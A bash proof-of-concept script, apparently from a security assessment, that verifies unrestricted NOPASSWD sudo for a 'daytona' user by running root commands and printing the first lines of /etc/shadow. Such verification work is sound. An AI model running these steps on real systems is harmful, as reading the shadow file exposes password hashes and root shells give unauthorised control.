#!/bin/bash

# POC: Privilege Escalation via Unrestricted Sudo Access
# Demonstrates that daytona user has unrestricted sudo access with NOPASSWD
# This allows arbitrary command execution as root without authentication

echo "[*] Testing unrestricted sudo access for privilege escalation"
echo "[*] Target: daytona user with unrestricted (ALL) NOPASSWD: ALL sudoers configuration"
echo ""

# Step 1: Check current user identity
echo "[Step 1] Check current user identity:"
id
CURRENT_UID=$?
echo ""

# Step 2: List sudo privileges
echo "[Step 2] Check sudo privileges available:"
sudo -l 2>&1
SUDO_LIST=$?
echo ""

# Step 3: Demonstrate root command execution via sudo without password
echo "[Step 3] Execute command as root via sudo (no password required):"
echo "Running: sudo whoami"
WHOAMI_OUTPUT=$(sudo whoami 2>&1)
echo "Output: $WHOAMI_OUTPUT"
echo ""

# Step 4: Demonstrate access to root-only files
echo "[Step 4] Demonstrate access to sensitive root files:"
echo "Attempting to read /etc/shadow (typically root-only):"
SHADOW_CHECK=$(sudo cat /etc/shadow 2>&1 | head -3)
if echo "$SHADOW_CHECK" | grep -q "root:"; then
    echo "✓ Successfully read /etc/shadow as root:"
    echo "$SHADOW_CHECK"
    SHADOW_SUCCESS=0
else
    echo "Note: /etc/shadow content or access may vary in test environment"
    SHADOW_SUCCESS=1
fi
echo ""

# Step 5: Verify unrestricted command execution
echo "[Step 5] Verify unrestricted command execution capability:"
echo "Testing: sudo id (execute 'id' command as root)"
SUDO_ID=$(sudo id 2>&1)
echo "Output: $SUDO_ID"
echo ""

# Step 6: Test interactive shell capability
echo "[Step 6] Verify interactive root shell capability:"
echo "Testing: sudo bash -c 'echo PRIVILEGED_SHELL_EXECUTED'"
SHELL_TEST=$(sudo bash -c 'echo PRIVILEGED_SHELL_EXECUTED' 2>&1)
echo "Output: $SHELL_TEST"
echo ""

# Final verdict
echo "[RESULT] Vulnerability Status:"
if [ "$WHOAMI_OUTPUT" = "root" ]; then
    echo "✓ CONFIRMED: Unrestricted sudo access with NOPASSWD"
    echo "✓ User daytona can execute ANY command as root without password"
    echo "✓ This represents a complete privilege escalation vulnerability"
    echo "✓ When combined with authentication bypass (RCE/WebSocket), system is fully compromised"
    exit 0
else
    echo "✗ Test inconclusive - unable to verify sudo access"
    exit 1
fi